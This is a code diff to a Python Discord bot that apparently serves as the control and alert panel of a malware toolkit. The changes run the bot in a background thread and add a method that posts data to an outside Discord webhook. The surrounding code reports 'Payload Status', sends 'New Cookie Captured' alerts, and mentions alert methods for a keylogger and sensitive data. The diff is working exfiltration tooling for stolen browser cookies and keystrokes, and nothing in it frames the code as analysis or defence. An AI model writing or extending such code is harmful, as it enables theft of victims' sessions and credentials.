@@ -2,31 +2,43 @@ import discord
 from discord.ext import commands
 import json
 import os
+import threading
 from datetime import datetime
+import requests
 
 class ProxyBot(commands.Bot):
     def __init__(self, webhook_url):
-        super().__init__(command_prefix='/', intents=discord.Intents.all())
+        intents = discord.Intents.all()
+        super().__init__(command_prefix='/', intents=intents)
         self.webhook_url = webhook_url
         self.proxy_running = True
         
     async def setup_hook(self):
-        await self.tree.sync()  # Sync slash commands
-        
-    def format_embed(self, title, description, color=0xc50f1f):
-        return discord.Embed(
-            title=title,
-            description=description,
-            color=color,
-            timestamp=datetime.now()
-        )
+        await self.tree.sync()
 
 class DiscordBot:
     def __init__(self, webhook_url, token):
         self.webhook_url = webhook_url
+        self.token = token
         self.bot = ProxyBot(webhook_url)
         self.setup_commands()
-        self.token = token
+        
+        # Start bot in a separate thread
+        self.bot_thread = threading.Thread(target=self.start_bot)
+        self.bot_thread.daemon = True  # This ensures the thread stops when the main program stops
+        self.bot_thread.start()
+
+    def start_bot(self):
+        try:
+            self.bot.run(self.token)
+        except Exception as e:
+            print(f"Discord bot error: {str(e)}")
+
+    def send_webhook(self, data):
+        try:
+            requests.post(self.webhook_url, json=data)
+        except Exception as e:
+            print(f"Webhook error: {str(e)}")
 
     def setup_commands(self):
         @self.bot.tree.command(name="help", description="Display all available commands")
@@ -106,6 +118,14 @@ class DiscordBot:
                 embed=self.bot.format_embed("Payload Status", status)
             )
 
+    def format_embed(self, title, description, color=0xc50f1f):
+        return discord.Embed(
+            title=title,
+            description=description,
+            color=color,
+            timestamp=datetime.now()
+        )
+
     def send_cookie_alert(self, cookie_data):
         embed = {
             "title": "🍪 New Cookie Captured",
@@ -121,6 +141,3 @@ class DiscordBot:
         self.send_webhook({"embeds": [embed]})
 
     # ... (other alert methods for keylogger, sensitive data, etc.)
-
-    def start(self):
-        self.bot.run(self.token)
